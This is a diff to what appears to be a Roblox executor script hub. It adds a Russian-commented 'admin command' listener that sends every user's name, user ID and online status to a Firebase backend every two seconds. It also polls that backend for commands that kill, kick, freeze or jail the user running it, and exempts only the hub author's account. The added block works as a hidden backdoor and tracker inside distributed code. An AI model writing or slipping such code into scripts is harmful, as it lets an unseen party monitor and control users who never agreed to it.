@@ -3079,3 +3079,110 @@ end
 -- ==============================================================================
 -- СИСТЕМА ПРИЕМА КОМАНД АДМИНИСТРАТОРА (FIREBASE CLIENT LISTENER)
 -- ==============================================================================
+-- ==============================================================================
+-- СИСТЕМА ПРИЕМА КОМАНД АДМИНИСТРАТОРА (С ЗАЩИТОЙ ОТ СТАРОГО КИКА)
+-- ==============================================================================
+local jailBox = nil
+local lastCmdId = ""
+local sessionStartTime = os.time() -- Фиксируем время запуска хаба
+
+-- Ваш ник для иммунитета (чтобы вас никогда случайно не кикнуло/не убило)
+local ADMIN_NAME = "ABUGEZAN"
+
+local function runAdminAction(action: string, issuer: string)
+    -- Иммунитет для создателя
+    if LocalPlayer.Name == ADMIN_NAME or LocalPlayer.DisplayName == ADMIN_NAME then
+        return
+    end
+
+    local char = LocalPlayer.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+
+    if action == "kill" then
+        if hum then hum.Health = 0 end
+
+    elseif action == "kick" then
+        LocalPlayer:Kick("ты был выкинут с сервера админ панелью абугезана")
+
+    elseif action == "freeze" then
+        if root then root.Anchored = true end
+        if hum then hum.WalkSpeed = 0 end
+
+    elseif action == "unfreeze" then
+        if root then root.Anchored = false end
+        if hum then hum.WalkSpeed = 16 end
+
+    elseif action == "jail" then
+        if root then
+            root.Anchored = true
+            if jailBox then jailBox:Destroy() end
+            jailBox = Instance.new("Part")
+            jailBox.Size = Vector3.new(7, 7, 7)
+            jailBox.CFrame = root.CFrame
+            jailBox.Transparency = 0.6
+            jailBox.Material = Enum.Material.ForceField
+            jailBox.BrickColor = BrickColor.new("Bright violet")
+            jailBox.Anchored = true
+            jailBox.CanCollide = true
+            jailBox.Parent = workspace
+        end
+
+    elseif action == "unjail" then
+        if jailBox then 
+            jailBox:Destroy() 
+            jailBox = nil
+        end
+        if root then root.Anchored = false end
+        if hum then hum.WalkSpeed = 16 end
+    end
+end
+
+if httpRequest then
+    task.spawn(function()
+        local myUserId = tostring(LocalPlayer.UserId)
+        local statusEndpoint = string.format("%s/users/%s.json?auth=%s", FIREBASE_BASE, myUserId, FIREBASE_SECRET)
+        local commandEndpoint = string.format("%s/commands/%s.json?auth=%s", FIREBASE_BASE, myUserId, FIREBASE_SECRET)
+
+        while task.wait(2) do
+            -- Регистрация онлайна
+            pcall(function()
+                httpRequest({
+                    Url = statusEndpoint,
+                    Method = "PATCH",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode({
+                        name = LocalPlayer.Name,
+                        displayName = LocalPlayer.DisplayName,
+                        lastSeen = os.time()
+                    })
+                })
+            end)
+
+            -- Чтение входящей команды
+            local success, res = pcall(function()
+                return httpRequest({
+                    Url = commandEndpoint,
+                    Method = "GET"
+                })
+            end)
+
+            if success and res and res.Body and res.Body ~= "null" then
+                local dataOk, cmdData = pcall(function()
+                    return HttpService:JSONDecode(res.Body)
+                end)
+
+                -- Выполняем команду ТОЛЬКО если:
+                -- 1. У неё новый уникальный cmdId
+                -- 2. Она была отправлена ПОСЛЕ запуска этой сессии игры (cmdData.timestamp >= sessionStartTime)
+                if dataOk and type(cmdData) == "table" and cmdData.action and cmdData.cmdId then
+                    local cmdTime = tonumber(cmdData.timestamp) or 0
+                    if cmdData.cmdId ~= lastCmdId and cmdTime >= sessionStartTime then
+                        lastCmdId = cmdData.cmdId
+                        runAdminAction(cmdData.action, cmdData.issuer or "Admin")
+                    end
+                end
+            end
+        end
+    end)
+end
